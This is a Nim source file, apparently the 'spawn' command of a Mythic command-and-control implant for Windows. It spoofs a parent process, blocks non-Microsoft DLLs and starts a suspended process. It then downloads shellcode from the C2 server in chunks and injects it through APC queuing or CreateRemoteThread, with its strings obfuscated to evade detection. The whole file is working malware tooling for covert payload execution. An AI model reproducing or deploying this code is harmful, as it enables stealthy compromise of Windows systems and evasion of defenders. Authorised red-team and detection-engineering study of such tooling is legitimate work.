import ../utils/m_responses
import ../utils/debug
import ../global_data
import ../utils/strenc
import std/[json, strutils, strformat, base64]

when defined(windows):
  import winim/lean
  
  const
    PROCESS_CREATE_PROCESS_SPAWN = 0x0080
    PROCESS_QUERY_INFORMATION_SPAWN = 0x0400
    EXTENDED_STARTUPINFO_PRESENT_SPAWN = 0x00080000
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS_SPAWN = 0x00020000
    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY_SPAWN = 0x00020007
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON_SPAWN = 0x100000000000'u64
  
  type
    PROC_THREAD_ATTRIBUTE_LIST_SPAWN = object
    LPPROC_THREAD_ATTRIBUTE_LIST_SPAWN = ptr PROC_THREAD_ATTRIBUTE_LIST_SPAWN
    
    STARTUPINFOEXA_SPAWN = object
      StartupInfo: STARTUPINFOA
      lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_SPAWN
  
  proc InitializeProcThreadAttributeListSpawn(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_SPAWN,
                                              dwAttributeCount: DWORD, dwFlags: DWORD,
                                              lpSize: ptr SIZE_T): WINBOOL
    {.importc: "InitializeProcThreadAttributeList", dynlib: obf("kernel32.dll"), stdcall.}
  
  proc UpdateProcThreadAttributeSpawn(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_SPAWN,
                                      dwFlags: DWORD, Attribute: DWORD_PTR,
                                      lpValue: PVOID, cbSize: SIZE_T,
                                      lpPreviousValue: PVOID, lpReturnSize: ptr SIZE_T): WINBOOL
    {.importc: "UpdateProcThreadAttribute", dynlib: obf("kernel32.dll"), stdcall.}
  
  proc DeleteProcThreadAttributeListSpawn(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_SPAWN): void
    {.importc: "DeleteProcThreadAttributeList", dynlib: obf("kernel32.dll"), stdcall.}

  proc createSuspendedProcessSpawn(spawntoPath: string, ppid: uint32, blockDlls: bool):
      tuple[success: bool, pi: PROCESS_INFORMATION, error: string] =
    var pi: PROCESS_INFORMATION
    let useExtended = ppid != 0 or blockDlls
    
    if useExtended:
      var attrCount: DWORD = 0
      if ppid != 0: attrCount += 1
      if blockDlls: attrCount += 1
      
      var parentHandle: HANDLE = 0
      if ppid != 0:
        parentHandle = OpenProcess(PROCESS_CREATE_PROCESS_SPAWN or PROCESS_QUERY_INFORMATION_SPAWN, 0, DWORD(ppid))
        if parentHandle == 0:
          return (false, pi, obf("Failed to open parent process: ") & $GetLastError())
      
      var size: SIZE_T = 0
      discard InitializeProcThreadAttributeListSpawn(nil, attrCount, 0, addr size)
      var attrList = newSeq[byte](size)
      let attrListPtr = cast[LPPROC_THREAD_ATTRIBUTE_LIST_SPAWN](addr attrList[0])
      
      if InitializeProcThreadAttributeListSpawn(attrListPtr, attrCount, 0, addr size) == 0:
        if parentHandle != 0: CloseHandle(parentHandle)
        return (false, pi, obf("Failed to initialize attribute list: ") & $GetLastError())
      
      if ppid != 0:
        if UpdateProcThreadAttributeSpawn(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS_SPAWN,
                                          addr parentHandle, SIZE_T(sizeof(HANDLE)), nil, nil) == 0:
          DeleteProcThreadAttributeListSpawn(attrListPtr)
          CloseHandle(parentHandle)
          return (false, pi, obf("Failed to update PPID attribute: ") & $GetLastError())
      
      var mitigationPolicy: uint64 = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON_SPAWN
      if blockDlls:
        if UpdateProcThreadAttributeSpawn(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY_SPAWN,
                                          addr mitigationPolicy, SIZE_T(sizeof(uint64)), nil, nil) == 0:
          DeleteProcThreadAttributeListSpawn(attrListPtr)
          if parentHandle != 0: CloseHandle(parentHandle)
          return (false, pi, obf("Failed to update BlockDLLs attribute: ") & $GetLastError())
      
      var siEx: STARTUPINFOEXA_SPAWN
      siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA_SPAWN).DWORD
      siEx.lpAttributeList = attrListPtr
      
      let success = CreateProcessA(spawntoPath, nil, nil, nil, FALSE,
                                    CREATE_SUSPENDED or EXTENDED_STARTUPINFO_PRESENT_SPAWN,
                                    nil, nil, addr siEx.StartupInfo, addr pi)
      
      DeleteProcThreadAttributeListSpawn(attrListPtr)
      if parentHandle != 0: CloseHandle(parentHandle)
      
      if success == 0:
        return (false, pi, obf("Failed to create suspended process: ") & $GetLastError())
    else:
      var si: STARTUPINFOA
      si.cb = sizeof(STARTUPINFOA).DWORD
      let success = CreateProcessA(spawntoPath, nil, nil, nil, FALSE,
                                    CREATE_SUSPENDED, nil, nil, addr si, addr pi)
      if success == 0:
        return (false, pi, obf("Failed to create process: ") & $GetLastError())
    
    return (true, pi, "")

  proc injectAndResume(pi: PROCESS_INFORMATION, shellcode: seq[byte],
                       technique: string): tuple[success: bool, error: string] =
    let pRemote = VirtualAllocEx(pi.hProcess, nil, SIZE_T(shellcode.len),
                                  MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if pRemote == nil:
      discard TerminateProcess(pi.hProcess, 0)
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      return (false, obf("VirtualAllocEx failed: ") & $GetLastError())
    
    var bytesWritten: SIZE_T
    if WriteProcessMemory(pi.hProcess, pRemote, unsafeAddr shellcode[0],
                          SIZE_T(shellcode.len), addr bytesWritten) == 0:
      discard TerminateProcess(pi.hProcess, 0)
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      return (false, obf("WriteProcessMemory failed: ") & $GetLastError())
    
    case technique.toLower()
    of obf("apc"):
      if QueueUserAPC(cast[PAPCFUNC](pRemote), pi.hThread, 0) == 0:
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, obf("QueueUserAPC failed: ") & $GetLastError())
    of obf("createremotethread"):
      var threadId: DWORD
      let hThread = CreateRemoteThread(pi.hProcess, nil, 0,
                                        cast[LPTHREAD_START_ROUTINE](pRemote),
                                        nil, 0, addr threadId)
      if hThread == 0:
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return (false, obf("CreateRemoteThread failed: ") & $GetLastError())
      CloseHandle(hThread)
    else:
      discard TerminateProcess(pi.hProcess, 0)
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      return (false, obf("Unknown injection technique: ") & technique)
    
    # Only resume the main thread for APC injection (APC fires on resume).
    # For CreateRemoteThread, the shellcode already runs on its own thread;
    # resuming the main thread lets the spawnto process execute and potentially
    # exit, which would kill the shellcode thread.
    if technique.toLower() == obf("apc"):
      discard ResumeThread(pi.hThread)
    CloseHandle(pi.hProcess)
    CloseHandle(pi.hThread)
    return (true, "")

type
  SpawnArgs = object
    uuid: string
    technique: string

proc spawn*(taskId: string, params: JsonNode): JsonNode =
  ## Spawn a new callback by downloading and injecting a payload into the spawnto process
  when defined(windows):
    try:
      let args = to(params, SpawnArgs)
      debug &"[DEBUG] Spawn: technique={args.technique}, uuid={args.uuid}"
      
      # Return initial response to request the payload file from Mythic
      return %*{
        obf("task_id"): taskId,
        obf("upload"): {
          obf("file_id"): args.uuid,
          obf("chunk_num"): 1,
          obf("chunk_size"): 512000,
          obf("full_path"): ""
        }
      }
      
    except Exception as e:
      return mythicError(taskId, obf("Spawn error: ") & e.msg)
  else:
    return mythicError(taskId, obf("spawn command is only available on Windows"))

proc executeSpawn*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode

proc processSpawnChunk*(taskId: string, params: JsonNode, chunkData: string,
                        totalChunks: int, currentChunk: int,
                        fileData: var seq[byte]): JsonNode =
  ## Process a chunk of the payload file being downloaded
  when defined(windows):
    try:
      let args = to(params, SpawnArgs)
      
      let decodedChunk = decode(chunkData)
      for b in decodedChunk:
        fileData.add(cast[byte](b))
      
      debug &"[DEBUG] Spawn: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
      
      if currentChunk < totalChunks:
        return %*{
          obf("task_id"): taskId,
          obf("upload"): {
            obf("chunk_size"): 512000,
            obf("file_id"): args.uuid,
            obf("chunk_num"): currentChunk + 1,
            obf("full_path"): ""
          }
        }
      
      return executeSpawn(taskId, fileData, params)
      
    except Exception as e:
      return mythicError(taskId, obf("Spawn chunk processing error: ") & e.msg)
  else:
    return mythicError(taskId, obf("spawn command is only available on Windows"))

proc executeSpawn*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode =
  ## Execute the spawn after download is complete
  when defined(windows):
    try:
      let args = to(params, SpawnArgs)
      
      if shellcode.len == 0:
        return mythicError(taskId, obf("Shellcode is empty - file download may have failed"))
      
      when hostCPU == "amd64":
        let (spawntoPath, spawntoArgs) = getSpawntoX64()
      else:
        let (spawntoPath, spawntoArgs) = getSpawntoX86()
      
      if spawntoPath.len == 0:
        return mythicError(taskId, obf("spawnto path is not set for this architecture"))
      
      let ppid = getPpid()
      let blockDlls = getBlockDlls()
      
      debug &"[DEBUG] Spawn: Creating process {spawntoPath} (ppid={ppid}, blockdlls={blockDlls})"
      
      let (success, pi, errorMsg) = createSuspendedProcessSpawn(spawntoPath, ppid, blockDlls)
      if not success:
        return mythicError(taskId, obf("Failed to create process: ") & errorMsg)
      
      let pid = pi.dwProcessId
      
      let (injSuccess, injError) = injectAndResume(pi, shellcode, args.technique)
      if not injSuccess:
        return mythicError(taskId, obf("Injection failed: ") & injError)
      
      return mythicSuccess(taskId, obf("Spawn: ") & args.technique &
                           obf(" injection into ") & spawntoPath &
                           obf(" successful (PID: ") & $pid & ")")
      
    except Exception as e:
      return mythicError(taskId, obf("Spawn execution error: ") & e.msg)
  else:
    return mythicError(taskId, obf("spawn command is only available on Windows"))
